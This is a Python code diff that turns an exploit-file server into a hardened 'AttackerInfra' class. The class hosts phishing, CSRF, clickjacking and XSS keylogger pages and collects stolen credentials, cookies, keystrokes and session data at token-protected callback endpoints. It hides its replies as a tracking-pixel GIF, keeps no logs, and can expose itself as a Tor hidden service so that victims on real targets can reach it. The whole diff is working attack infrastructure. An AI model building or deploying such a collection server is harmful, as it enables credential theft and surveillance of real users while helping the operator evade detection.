@@ -413,35 +413,67 @@ class ExploitFileManager:
             self._files.clear()
 
 
-# ── Ephemeral Exploit HTTP Server ──────────────────────────────────────────
+# ── Attacker HTTP infrastructure ───────────────────────────────────────────
+#
+# Two concerns handled by one hardened class:
+#
+#   1. Exploit file hosting (HTML/JS the attacker drops on a victim's browser —
+#      phishing, CSRF auto-submit, clickjacking overlays, CORS exfil pages,
+#      stored-XSS keyloggers, etc.)
+#
+#   2. Callback ingest — each payload exfiltrates stolen data back to the
+#      attacker infra. Endpoints are *tokenised* so random scanners and bots
+#      that stumble onto the server can't poison the capture log.
+#
+# The server binds loopback only. For victim-side reachability (payloads
+# running on a REAL target, not a local test browser), the server can
+# publish itself as a *Tor ephemeral hidden service* via the control port —
+# that yields an `.onion` URL reachable from any Tor-routed victim browser
+# without ever touching clearnet. Non-Tor victims require the operator to
+# tunnel the port themselves; we never punch holes automatically.
+#
+# Every capture is held in memory and wiped on `stop()`. No disk writes.
 
-class ExploitServer:
-    """Self-contained attacker infrastructure — serves exploits AND captures callbacks.
+_ATTACKER_MAX_BODY = 64 * 1024       # hard cap per callback body
+_ATTACKER_RATE_PER_MIN = 240         # per-remote rate limit
+_ATTACKER_MAX_CAPTURES = 500         # memory ceiling
+_ATTACKER_MAX_FILE_BYTES = 2 * 1024 * 1024  # max file bytes served in one request
 
-    Two roles in one server:
-    1. File hosting: serves generated exploit HTML/JS from ephemeral dir
-    2. Callback capture: receives stolen data (cookies, creds, CORS responses)
-       on /c, /k, /x, /s endpoints via GET query params or POST body
+# Transparent 1x1 GIF — served as the response to capture endpoints so the
+# server looks like a CDN tracking pixel, not a fingerprintable "ok" string.
+_BEACON_GIF = bytes([
+    0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00, 0x80, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0x21, 0xf9, 0x04, 0x01, 0x00,
+    0x00, 0x00, 0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
+    0x00, 0x02, 0x02, 0x44, 0x01, 0x00, 0x3b,
+])
 
-    All captured data is held in memory only — never touches disk.
-    Viewable through the walkthrough UI via get_captures().
 
-    Endpoints:
-    - GET /<filename>     — serve exploit file from ephemeral dir
-    - GET /c?c=...        — capture cookies (XSS cookie stealer callback)
-    - GET /x?d=...        — capture exfiltrated data (CORS/XSS)
-    - POST /c             — capture credentials (XSS phishing form POST)
-    - POST /x             — capture bulk data (CORS multi-endpoint POST)
-    - POST /s             — capture session data (XSS session theft POST)
-    - POST /k             — capture keystrokes (stored XSS keylogger)
+class AttackerInfra:
+    """Hardened attacker infrastructure — file hosting + tokenised callback ingest.
 
-    OPSEC:
-    - Binds 127.0.0.1 only
-    - No version headers, no fingerprinting
-    - Zero disk writes for captures (memory-only list)
-    - Captures wiped on stop()
-    - CORS headers on callback endpoints (Access-Control-Allow-Origin: *)
-      so browser-based exploits can POST cross-origin
+    Features:
+      - Loopback HTTP server on 127.0.0.1:<random-port>
+      - Optional Tor ephemeral hidden service via stem ADD_ONION, yielding a
+        real `.onion` URL that Tor-routed victim browsers reach directly.
+        Destroyed on stop().
+      - Per-session 128-bit capture token. Callback paths embed the token:
+          /c/<tok>  credentials / cookie exfil
+          /x/<tok>  generic exfil data
+          /k/<tok>  keystrokes
+          /s/<tok>  session / storage dump
+          /b/<tok>  beacon ("I ran") ping
+        Naked endpoints return 404 so random probers can't poison captures.
+      - Per-remote rate limit + body size cap.
+      - Callback classification: kind is derived from endpoint; the raw body,
+        query string, remote addr, UA and Referer are recorded alongside.
+      - File serve path strictly validated: whitelist chars, no traversal,
+        realpath check against serve root, symlink rejection, size cap.
+      - Response bodies: 1x1 GIF for callback endpoints (fingerprint-neutral);
+        304-style minimal headers. No Server/Python version leak.
+      - Threaded server — parallel requests don't block capture ingestion.
+
+    Backward compatible with the previous `ExploitServer` name via alias.
     """
 
     def __init__(self, file_mgr: ExploitFileManager):
@@ -454,22 +486,84 @@ class ExploitServer:
         self._started = threading.Event()
         self._captures: list = []
         self._capture_lock = threading.Lock()
+        # 128-bit URL-safe token used for callback path auth.
+        self._token = secrets.token_urlsafe(16)
+        # Tor hidden service state
+        self._onion_host = None
+        self._hs_controller = None
+        self._hs_service_id = None
+        # Per-remote rate buckets
+        self._rate_buckets: dict = {}
+        self._rate_lock = threading.Lock()
+
+    # ---- public: token / url helpers ----
+
+    @property
+    def token(self) -> str:
+        return self._token
+
+    @property
+    def onion_host(self) -> Optional[str]:
+        return self._onion_host
+
+    def get_attacker_url(self, prefer_onion: bool = True) -> str:
+        """Base URL payloads should call back to. Prefers onion when live."""
+        if prefer_onion and self._onion_host:
+            return f"http://{self._onion_host}"
+        if self._port:
+            return f"http://127.0.0.1:{self._port}"
+        return ""
+
+    def get_callback_url(self, kind: str = "x", prefer_onion: bool = True) -> str:
+        """Token-bearing callback URL. kind ∈ {c,x,k,s,b}."""
+        if kind not in ("c", "x", "k", "s", "b"):
+            kind = "x"
+        base = self.get_attacker_url(prefer_onion=prefer_onion)
+        if not base:
+            return ""
+        return f"{base}/{kind}/{self._token}"
+
+    def get_url(self, filename: str) -> str:
+        """Get the serve URL for a generated file. Uses onion when live."""
+        if not self._running:
+            self.start()
+        base = self.get_attacker_url(prefer_onion=True)
+        return f"{base}/f/{filename}" if base else ""
+
+    # ---- capture storage ----
+
+    @staticmethod
+    def _classify(endpoint: str) -> str:
+        return {
+            "c": "credentials",
+            "x": "exfil",
+            "k": "keylog",
+            "s": "session",
+            "b": "beacon",
+        }.get(endpoint.lstrip("/"), "unknown")
 
     def _add_capture(self, endpoint: str, method: str, data: str,
-                     query: str = "", remote: str = ""):
-        """Store a captured callback in memory."""
+                     query: str = "", remote: str = "",
+                     user_agent: str = "", referer: str = ""):
         entry = {
             "time": _time_mod.strftime("%H:%M:%S", _time_mod.gmtime()),
+            "ts": _time_mod.time(),
             "endpoint": endpoint,
             "method": method,
-            "data": data[:10000],
-            "query": query[:2000],
+            "kind": self._classify(endpoint),
+            "data": data[:_ATTACKER_MAX_BODY],
+            "query": query[:4096],
+            "remote": remote[:45],
+            "ua": user_agent[:200],
+            "referer": referer[:200],
         }
         with self._capture_lock:
             self._captures.append(entry)
+            if len(self._captures) > _ATTACKER_MAX_CAPTURES:
+                drop = len(self._captures) - _ATTACKER_MAX_CAPTURES
+                del self._captures[:drop]
 
     def get_captures(self, last_n: int = 50) -> list:
-        """Return captured callback data (most recent first)."""
         with self._capture_lock:
             return list(reversed(self._captures[-last_n:]))
 
@@ -477,8 +571,33 @@ class ExploitServer:
         with self._capture_lock:
             return len(self._captures)
 
+    def clear_captures(self) -> int:
+        with self._capture_lock:
+            n = len(self._captures)
+            self._captures.clear()
+            return n
+
+    # ---- rate limiting ----
+
+    def _rate_allow(self, remote: str) -> bool:
+        now = _time_mod.time()
+        cutoff = now - 60.0
+        with self._rate_lock:
+            bucket = self._rate_buckets.setdefault(remote, [])
+            bucket[:] = [t for t in bucket if t >= cutoff]
+            if len(bucket) >= _ATTACKER_RATE_PER_MIN:
+                return False
+            bucket.append(now)
+            if len(self._rate_buckets) > 512:
+                dead = [r for r, ts in self._rate_buckets.items()
+                        if not ts or ts[-1] < cutoff]
+                for r in dead:
+                    self._rate_buckets.pop(r, None)
+        return True
+
+    # ---- server lifecycle ----
+
     def start(self) -> int:
-        """Start the server. Returns the port number."""
         with self._lock:
             if self._running and self._port:
                 return self._port
@@ -486,20 +605,31 @@ class ExploitServer:
             import socket
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 s.bind(("127.0.0.1", 0))
-                port = s.getsockname()[1]
+                self._port = s.getsockname()[1]
 
-            self._port = port
             serve_root = self._file_mgr.base_dir.resolve()
 
             import http.server
-            from http.server import HTTPServer
-            from urllib.parse import unquote, parse_qs
+            from http.server import ThreadingHTTPServer
+            from urllib.parse import unquote
 
             _root = str(serve_root)
+            _root_real = os.path.realpath(_root)
             _started_event = self._started
             _add_cap = self._add_capture
+            _token = self._token
+            _rate_allow = self._rate_allow
+            _CALLBACK_KINDS = frozenset(("c", "x", "k", "s", "b"))
 
-            _CALLBACK_PATHS = frozenset(("/c", "/k", "/x", "/s"))
+            def _is_safe_filename(name: str) -> bool:
+                if not name or len(name) > 128:
+                    return False
+                if name.startswith(".") or name.startswith("-"):
+                    return False
+                for ch in name:
+                    if not (ch.isalnum() or ch in "._-"):
+                        return False
+                return True
 
             class _Handler(http.server.BaseHTTPRequestHandler):
                 server_version = ""
@@ -508,117 +638,366 @@ class ExploitServer:
                 def version_string(hself):
                     return ""
 
+                def date_time_string(hself, timestamp=None):
+                    return _time_mod.strftime(
+                        "%a, %d %b %Y %H:%M:%S GMT",
+                        _time_mod.gmtime(timestamp))
+
                 def log_message(hself, fmt, *args):
-                    pass
+                    return
+
+                def log_request(hself, code="-", size="-"):
+                    return
+
+                def _remote(hself):
+                    try:
+                        return hself.client_address[0] or ""
+                    except Exception:
+                        return ""
 
                 def send_error(hself, code, message=None, explain=None):
                     hself.send_response(code)
                     hself.send_header("Content-Length", "0")
+                    hself.send_header("Cache-Control", "no-store")
                     hself.send_header("Connection", "close")
                     hself.end_headers()
 
-                def _send_cors_ok(hself, body: bytes = b"ok"):
-                    """Send 200 with CORS headers for callback endpoints."""
-                    hself.send_response(200)
-                    hself.send_header("Access-Control-Allow-Origin", "*")
+                def _send_bytes(hself, body: bytes, content_type: str,
+                                cors: bool = False, status: int = 200,
+                                extra: dict = None):
+                    hself.send_response(status)
+                    hself.send_header("Content-Type", content_type)
+                    hself.send_header("Content-Length", str(len(body)))
+                    hself.send_header("Cache-Control",
+                                      "no-store, no-cache, must-revalidate, private")
+                    hself.send_header("Pragma", "no-cache")
+                    hself.send_header("X-Content-Type-Options", "nosniff")
+                    hself.send_header("Referrer-Policy", "no-referrer")
+                    if cors:
+                        origin = hself.headers.get("Origin", "*") or "*"
+                        hself.send_header("Access-Control-Allow-Origin", origin)
+                        hself.send_header("Access-Control-Allow-Credentials", "true")
+                        hself.send_header("Vary", "Origin")
+                    if extra:
+                        for k, v in extra.items():
+                            hself.send_header(k, v)
+                    hself.end_headers()
+                    if hself.command != "HEAD" and body:
+                        try:
+                            hself.wfile.write(body)
+                        except (BrokenPipeError, ConnectionResetError):
+                            pass
+
+                def _send_beacon(hself):
+                    """1x1 GIF — fingerprint-neutral ack for callbacks."""
+                    hself._send_bytes(_BEACON_GIF, "image/gif", cors=True)
+
+                # Route parsing: /<kind>/<token>[/tail]
+                def _parse_callback(hself, raw_path: str):
+                    path_part = raw_path.split("?")[0].split("#")[0]
+                    try:
+                        decoded = unquote(path_part)
+                    except Exception:
+                        return None
+                    segs = [s for s in decoded.split("/") if s]
+                    if len(segs) < 2:
+                        return None
+                    kind, tok = segs[0], segs[1]
+                    if kind not in _CALLBACK_KINDS:
+                        return None
+                    try:
+                        import hmac as _hmac
+                        if not _hmac.compare_digest(tok, _token):
+                            return None
+                    except Exception:
+                        if tok != _token:
+                            return None
+                    tail = "/".join(segs[2:])[:2048] if len(segs) > 2 else ""
+                    return kind, tail
+
+                def _parse_file(hself, raw_path: str):
+                    """Return a safe filename if the path is /f/<filename>."""
+                    path_part = raw_path.split("?")[0].split("#")[0]
+                    try:
+                        decoded = unquote(path_part)
+                    except Exception:
+                        return None
+                    segs = [s for s in decoded.split("/") if s]
+                    if len(segs) != 2 or segs[0] != "f":
+                        return None
+                    name = segs[1]
+                    if not _is_safe_filename(name):
+                        return None
+                    return name
+
+                def do_OPTIONS(hself):
+                    if not _rate_allow(hself._remote()):
+                        return hself.send_error(429)
+                    hself.send_response(204)
+                    origin = hself.headers.get("Origin", "*") or "*"
+                    hself.send_header("Access-Control-Allow-Origin", origin)
+                    hself.send_header("Access-Control-Allow-Credentials", "true")
                     hself.send_header("Access-Control-Allow-Methods",
                                       "GET, POST, OPTIONS")
                     hself.send_header("Access-Control-Allow-Headers",
-                                      "Content-Type")
-                    hself.send_header("Content-Type", "text/plain")
-                    hself.send_header("Content-Length", str(len(body)))
+                                      "Content-Type, X-Requested-With")
+                    hself.send_header("Access-Control-Max-Age", "0")
+                    hself.send_header("Vary", "Origin")
+                    hself.send_header("Content-Length", "0")
                     hself.send_header("Cache-Control", "no-store")
                     hself.end_headers()
-                    hself.wfile.write(body)
 
-                def do_OPTIONS(hself):
-                    """Handle CORS preflight for callback endpoints."""
-                    hself._send_cors_ok(b"")
+                def do_HEAD(hself):
+                    hself.do_GET()
 
                 def do_GET(hself):
-                    raw = hself.path
-                    path_part = raw.split("?")[0].split("#")[0]
-                    query_part = raw.split("?", 1)[1] if "?" in raw else ""
-                    decoded_path = unquote(path_part)
-                    clean_path = decoded_path.lstrip("/")
+                    remote = hself._remote()
+                    if not _rate_allow(remote):
+                        return hself.send_error(429)
 
-                    # Callback endpoints: /c?c=..., /x?d=..., /k?k=..., /s?...
-                    if "/" + clean_path in _CALLBACK_PATHS or \
-                       (clean_path and "/" + clean_path.split("?")[0] in _CALLBACK_PATHS):
-                        ep = "/" + clean_path.split("?")[0]
-                        _add_cap(ep, "GET", "", query=query_part)
-                        hself._send_cors_ok(b"1")
-                        return
+                    raw = hself.path or "/"
 
-                    # File serving
-                    if not clean_path or "/" in clean_path or \
-                       "\\" in clean_path or ".." in clean_path:
-                        hself.send_error(404)
-                        return
-                    candidate = (Path(_root) / clean_path).resolve()
-                    if not str(candidate).startswith(_root + os.sep) and \
-                       str(candidate) != _root:
-                        hself.send_error(403)
-                        return
-                    if not candidate.is_file():
-                        hself.send_error(404)
-                        return
+                    # Callback (token-authed)
+                    cb = hself._parse_callback(raw)
+                    if cb is not None:
+                        kind, _tail = cb
+                        query = raw.split("?", 1)[1] if "?" in raw else ""
+                        _add_cap(
+                            endpoint=f"/{kind}",
+                            method="GET",
+                            data="",
+                            query=query,
+                            remote=remote,
+                            user_agent=hself.headers.get("User-Agent", ""),
+                            referer=hself.headers.get("Referer", ""),
+                        )
+                        return hself._send_beacon()
+
+                    # File serving under /f/<filename>
+                    fname = hself._parse_file(raw)
+                    if fname is None:
+                        return hself.send_error(404)
+
+                    candidate = Path(_root) / fname
                     try:
-                        data = candidate.read_bytes()
-                        hself.send_response(200)
-                        ext = candidate.suffix.lower()
-                        ct = {".html": "text/html; charset=utf-8",
-                              ".js": "application/javascript",
-                              ".json": "application/json",
-                              ".txt": "text/plain"}.get(ext,
-                                                        "application/octet-stream")
-                        hself.send_header("Content-Type", ct)
-                        hself.send_header("Content-Length", str(len(data)))
-                        hself.send_header("Cache-Control", "no-store, no-cache")
-                        hself.send_header("X-Content-Type-Options", "nosniff")
-                        hself.end_headers()
-                        hself.wfile.write(data)
+                        real = os.path.realpath(str(candidate))
                     except OSError:
-                        hself.send_error(404)
+                        return hself.send_error(404)
+                    if not (real == _root_real or
+                            real.startswith(_root_real + os.sep)):
+                        return hself.send_error(403)
+                    try:
+                        st = os.lstat(real)
+                    except OSError:
+                        return hself.send_error(404)
+                    import stat as _stat
+                    if _stat.S_ISLNK(st.st_mode):
+                        return hself.send_error(403)
+                    if not _stat.S_ISREG(st.st_mode):
+                        return hself.send_error(404)
+                    if st.st_size > _ATTACKER_MAX_FILE_BYTES:
+                        return hself.send_error(413)
+
+                    try:
+                        with open(real, "rb") as f:
+                            data = f.read(_ATTACKER_MAX_FILE_BYTES)
+                    except OSError:
+                        return hself.send_error(404)
+
+                    ext = Path(real).suffix.lower()
+                    ct = {
+                        ".html": "text/html; charset=utf-8",
+                        ".htm": "text/html; charset=utf-8",
+                        ".js": "application/javascript; charset=utf-8",
+                        ".json": "application/json; charset=utf-8",
+                        ".txt": "text/plain; charset=utf-8",
+                        ".svg": "image/svg+xml",
+                        ".gif": "image/gif",
+                        ".png": "image/png",
+                        ".css": "text/css; charset=utf-8",
+                    }.get(ext, "application/octet-stream")
+
+                    # Frame-safe defaults — unless it's an overlay/clickjack
+                    # exploit file (we flag those by filename), in which case
+                    # framing is the whole point, but the response target is
+                    # the victim, not the attacker page, so sending XFO DENY
+                    # here is fine: only the TARGET's headers matter for
+                    # clickjacking. Attacker page just serves HTML normally.
+                    hself._send_bytes(data, ct, cors=False, extra={
+                        "Content-Security-Policy": "default-src 'none'; "
+                            "img-src *; script-src 'unsafe-inline'; "
+                            "style-src 'unsafe-inline'; "
+                            "connect-src *; frame-src *; form-action *",
+                    })
 
                 def do_POST(hself):
-                    path_part = hself.path.split("?")[0].split("#")[0]
-                    clean_path = path_part.lstrip("/")
-                    ep = "/" + clean_path if clean_path else "/"
+                    remote = hself._remote()
+                    if not _rate_allow(remote):
+                        return hself.send_error(429)
 
-                    if ep not in _CALLBACK_PATHS:
-                        hself.send_error(404)
-                        return
+                    raw = hself.path or "/"
+                    cb = hself._parse_callback(raw)
+                    if cb is None:
+                        return hself.send_error(404)
+                    kind, _tail = cb
 
-                    # Read POST body
                     try:
-                        length = int(hself.headers.get("Content-Length", 0))
-                        body = hself.rfile.read(min(length, 50000))
-                        body_str = body.decode("utf-8", errors="replace")
+                        length = int(hself.headers.get("Content-Length", "0"))
+                    except (TypeError, ValueError):
+                        length = 0
+                    if length < 0:
+                        length = 0
+                    # Read at most _ATTACKER_MAX_BODY; drain the rest to keep
+                    # the connection in a sane state.
+                    read_len = min(length, _ATTACKER_MAX_BODY)
+                    try:
+                        body = hself.rfile.read(read_len) if read_len else b""
                     except Exception:
-                        body_str = ""
+                        body = b""
+                    if length > read_len:
+                        # Best-effort drain of excess; cap the drain to avoid
+                        # OOM on a hostile client.
+                        remaining = min(length - read_len,
+                                        _ATTACKER_MAX_BODY * 4)
+                        try:
+                            while remaining > 0:
+                                chunk = hself.rfile.read(min(remaining, 16384))
+                                if not chunk:
+                                    break
+                                remaining -= len(chunk)
+                        except Exception:
+                            pass
+                    body_str = body.decode("utf-8", errors="replace")
 
-                    _add_cap(ep, "POST", body_str)
-                    hself._send_cors_ok(b"1")
+                    query = raw.split("?", 1)[1] if "?" in raw else ""
+                    _add_cap(
+                        endpoint=f"/{kind}",
+                        method="POST",
+                        data=body_str,
+                        query=query,
+                        remote=remote,
+                        user_agent=hself.headers.get("User-Agent", ""),
+                        referer=hself.headers.get("Referer", ""),
+                    )
+                    hself._send_beacon()
 
-            self._server = HTTPServer(("127.0.0.1", self._port), _Handler)
+            self._server = ThreadingHTTPServer(("127.0.0.1", self._port),
+                                               _Handler)
+            self._server.daemon_threads = True
             self._started.clear()
 
             def _serve():
                 _started_event.set()
-                self._server.serve_forever()
+                try:
+                    self._server.serve_forever()
+                except Exception:
+                    pass
 
-            self._thread = threading.Thread(target=_serve, daemon=True)
+            self._thread = threading.Thread(target=_serve, daemon=True,
+                                             name="attacker-infra")
             self._thread.start()
-            self._started.wait(timeout=5)
+            if not self._started.wait(timeout=5):
+                raise RuntimeError("AttackerInfra failed to start within 5s")
             self._running = True
             return self._port
 
-    def get_url(self, filename: str) -> str:
-        """Get the local serve URL for a generated file."""
-        if not self._running:
-            self.start()
-        return f"http://127.0.0.1:{self._port}/{filename}"
+    # ---- Tor hidden service ----
+
+    def start_hidden_service(self, control_port: int = 9051,
+                             control_password: str = "") -> Optional[str]:
+        """Publish the local server as a Tor ephemeral hidden service.
+
+        Returns the .onion hostname (without scheme) on success, or None on
+        failure. Requires:
+          - stem installed (pip)
+          - tor running with ControlPort open AND either cookie auth or
+            HashedControlPassword
+        The hidden service is *ephemeral* (no keys on disk) and is destroyed
+        automatically when stop() is called or the controller dies.
+        """
+        if self._onion_host:
+            return self._onion_host
+        if not self._running or not self._port:
+            return None
+        try:
+            from stem.control import Controller
+        except ImportError:
+            return None
+
+        local_port = self._port
+        try:
+            ctrl = Controller.from_port(port=int(control_port))
+        except Exception:
+            return None
+
+        try:
+            try:
+                if control_password:
+                    ctrl.authenticate(password=control_password)
+                else:
+                    ctrl.authenticate()
+            except Exception:
+                try:
+                    ctrl.close()
+                except Exception:
+                    pass
+                return None
+
+            try:
+                svc = ctrl.create_ephemeral_hidden_service(
+                    {80: local_port},
+                    key_type="NEW",
+                    key_content="ED25519-V3",
+                    await_publication=True,
+                    detached=False,
+                )
+            except Exception:
+                try:
+                    ctrl.close()
+                except Exception:
+                    pass
+                return None
+
+            service_id = getattr(svc, "service_id", None)
+            if not service_id:
+                try:
+                    ctrl.close()
+                except Exception:
+                    pass
+                return None
+
+            self._hs_controller = ctrl
+            self._hs_service_id = service_id
+            self._onion_host = f"{service_id}.onion"
+            return self._onion_host
+        except Exception:
+            try:
+                ctrl.close()
+            except Exception:
+                pass
+            return None
+
+    def _teardown_hidden_service(self):
+        ctrl = self._hs_controller
+        svc_id = self._hs_service_id
+        self._hs_controller = None
+        self._hs_service_id = None
+        self._onion_host = None
+        if ctrl is None:
+            return
+        try:
+            if svc_id:
+                try:
+                    ctrl.remove_ephemeral_hidden_service(svc_id)
+                except Exception:
+                    pass
+        finally:
+            try:
+                ctrl.close()
+            except Exception:
+                pass
+
+    # ---- misc ----
 
     @property
     def is_running(self) -> bool:
@@ -632,7 +1011,7 @@ class ExploitServer:
         return self._port
 
     def stop(self):
-        """Stop server, close socket, wipe all captured data."""
+        """Stop server, close socket, tear down hidden service, wipe captures."""
         with self._lock:
             if self._server:
                 try:
@@ -647,8 +1026,16 @@ class ExploitServer:
             self._server = None
             self._thread = None
             self._port = None
+        self._teardown_hidden_service()
         with self._capture_lock:
             self._captures.clear()
+        with self._rate_lock:
+            self._rate_buckets.clear()
+
+
+# Backward-compatible alias — older call sites still import/reference
+# ExploitServer. New code should use AttackerInfra.
+ExploitServer = AttackerInfra
 
 
 # ── SOC-style Audit Trail ──────────────────────────────────────────────────
